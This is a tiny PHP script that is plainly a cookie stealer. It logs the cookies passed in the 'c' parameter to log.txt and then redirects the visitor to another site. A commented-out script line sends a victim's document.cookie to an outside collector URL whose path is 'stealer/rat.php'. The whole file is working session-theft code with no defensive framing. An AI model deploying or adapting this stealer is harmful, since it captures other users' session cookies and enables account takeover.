<?php

$cookies = $_GET["c"];

$file = fopen('log.txt', 'a');

fwrite($file, $cookies . "\n\n");


header ('location:http://racer.eflyax.cz');

?>



<!-- <script>document.location='http://exapos.nootgaming.cz/stealer/rat.php?c='+document.cookie;</script> -->